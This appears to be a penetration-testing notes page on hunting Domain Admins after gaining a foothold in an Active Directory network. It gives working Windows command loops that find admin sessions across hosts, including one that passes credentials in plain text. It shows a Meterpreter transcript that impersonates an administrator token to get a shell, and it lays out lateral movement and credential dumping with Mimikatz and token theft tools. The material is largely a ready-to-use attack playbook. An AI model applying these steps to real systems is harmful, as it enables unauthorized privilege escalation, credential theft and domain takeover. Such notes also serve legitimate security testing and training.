---
description: >-
  Already got access to internal system? Is it AD-joined computer? Is it Domain
  User? Let's hunt for Domain Admins
---

# Initial Access - Got Shell?

## **Manual Way of Finding**Finding Domain Admin Processes

### **Technique 1: Checking Locally**

```python
# Check for Domain Admins user
net group "Domain Admins" /domain

# list processes and process owners, cross reference the task list with the Domain Admin
Tasklist /v
```

### **Technique 2: Querying Domain Controllers for Active Domain User Sessions**

```python
# Gather a list of Domain Controllers from the “Domain Controllers” OU using LDAP queries
net group "Domain Controllers" /domain

# Alternatively, you can look them up via DNS.
nslookup –type=SRV _ldap._tcp.

# Gather a list of all of the active domain sessions by querying each of the domain controllers using Netsess.exe
# Download at http://www.joeware.net/freetools/tools/netsess/index.htm
# It will return the IP Address of the active session, the domain account, the session start time, and the idle time.
# Cross reference the Domain Admin list with the active session list to determine which IP addresses have active domain tokens on them.
Netsess.exe –h

# dcs.txt = list of domain controllers 
# admins.txt = list of Domain Admins. 
FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i && @netsess -h %i 2>nul > sessions.txt &&
FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a

```

### **Technique 3: Scanning Remote Systems for Running Tasks**

```python
# enumerate the Domain Admins first
# ips.txt contains a list of the target systems and the names.txt contains a list of the Domain Admins.
FOR /F %i in (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL > output.txt &&
FOR /F %n in (names.txt) DO @type output.txt | findstr %n > NUL && echo [!] %n was found running a process on %i && pause
```

### **Technique 4: Scanning Remote Systems for NetBIOS Information**

```python
# Some Windows systems still allow users to query for logged in users via the NetBIOS queries.
# Quick and dirty Windows command line script that will scan remote systems for active Domain Admins sessions. 
# Note: The script can be ran as a non-domain user.
for /F %i in (ips.txt) do @echo [+] Checking %i && nbtstat -A %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i

OR

# use the nbtscan tool which runs a little faster
# download nbtscan here, https://www.softpedia.com/get/Network-Tools/Network-IP-Scanner/nbtscan.shtml
for /F %i in (ips.txt) do @echo [+] Checking %i && nbtscan -f %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
```

### **Technique 5: Got Meterpreter?**

```python
meterpreter > load incognito
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
FESBOK.SG\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > impersonate_token FESBOK.SG\\Administrator
[+] Delegation token available
[+] Successfully impersonated user FESBOK.SG\Administrator
meterpreter > getuid
Server username: FESBOK.SG\Administrator
meterpreter > shell
Process 2804 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32> whoami
whoami
FESBOK.SG\administrator

```

\*\*\*\*

**Reference**

\*\*\*\*[**https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/**](https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/)\*\*\*\*

## Automatically enumerating the domain <a id="automatically-enumerating-the-domain"></a>

**Goal: Discover computers, users, groups and GPOs** We want to learn as much as possible about the domain. That means identifying what computers are in the domain, which users and who these belong too. There will also be GPOs applied that can be enumerated. Certain domains may have several trusts too. Bloodhound is a key tool for this step. Bloodhound should already have given you a path now. A default query in BH is "Shortest path do DA" which should give you a few options, granted the size and/or configuration of the domain.

**Technique**

* Run Bloodhound collection
* Look for DA sessions
* Look for local admin privileges for current user
* Identify paths to Domain Admin

**Tools**

* Bloodhound
* PowerView
* Empire



## Move towards Domain Admin

**Goal: Command execution on a box with Domain Admin session on**

**Technique**

* Pick a target box where DA has session
* Enumerate privileges on that box
* Enumerate whether remote command execution is possible

**Tools**

* WinRM
* WMI
* PsExec
* Empire lateral movement modules



## Hijack Domain Admin access <a id="hijack-domain-admin-access"></a>

**Goal: Command execution as DA or DA credentials** By this point you should have access to execute command on a box that hopefully has a domain admin logged in. The goal of this step is then to escalate privileges to DA. If you are local administrator on the box, this is easy. You can simply use mimikatz to dump credentials \(passwords or hashes\) for users. If that is not an option you can use token impersonation to steal the DA's token. However, if no admin privileges at all is possible to gain, you should start enumerating who is local admin on this box and see if you can acqurie said privilege.

**Technique**

* If local admin -&gt; Mimikatz
* Else -&gt; enumerate who is local admin
* Gain user to local admin for said box

**Tools**

* Powershell
* PowerView
* Invoke-TokenImpersonation
* Invoke-InternalMonologue



**References**

\*\*\*\*[**https://hunter2.gitbook.io/darthsidious/getting-started/external-network-access-to-domain-admin**](https://hunter2.gitbook.io/darthsidious/getting-started/external-network-access-to-domain-admin)\*\*\*\*

